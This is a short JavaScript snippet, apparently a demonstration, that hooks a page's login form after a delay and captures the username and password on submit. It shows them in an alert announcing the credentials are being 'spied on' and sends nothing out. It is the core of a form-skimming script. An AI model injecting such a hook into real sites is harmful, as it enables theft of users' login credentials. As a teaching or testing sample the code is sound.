function formHandler(e) {
  console.log(e);
  if (e?.srcElement.length > 0) {
    alert("The credentials are been spied on: \n" +
      "Login is : " + e.srcElement[0].value + "\n" +
      "Password is : " + e.srcElement[1].value + "\n"
    );
  }
}

function hookMessageHandler() {
  login = document.getElementById("Login");
  login.onsubmit = (e) => {
    formHandler(e);
  };
  alert("Form is now hooked and ready to be spied on")
}

setTimeout(hookMessageHandler, 3000);
